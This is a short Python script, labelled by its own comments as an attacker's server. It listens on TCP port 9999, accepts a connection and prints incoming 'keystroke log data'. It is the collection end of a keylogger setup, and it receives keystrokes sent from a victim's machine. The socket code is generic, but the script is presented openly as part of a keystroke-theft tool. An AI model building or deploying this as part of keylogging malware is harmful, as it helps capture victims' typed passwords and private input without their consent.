import socket
#Script for attacker to listen on a specific port.
# Configuration for the attacker server
HOST = "0.0.0.0"  # Listen on all available interfaces
PORT = 9999       # Port to listen on

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)
        print(f"[+] Attacker server listening on port {PORT}...")
        
        conn, addr = server_socket.accept()
        print(f"[+] Connection established from {addr}")

        with conn:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                # Print the keystroke log data as it arrives
                print(data.decode("utf-8"), end="")

if __name__ == "__main__":
    start_server()
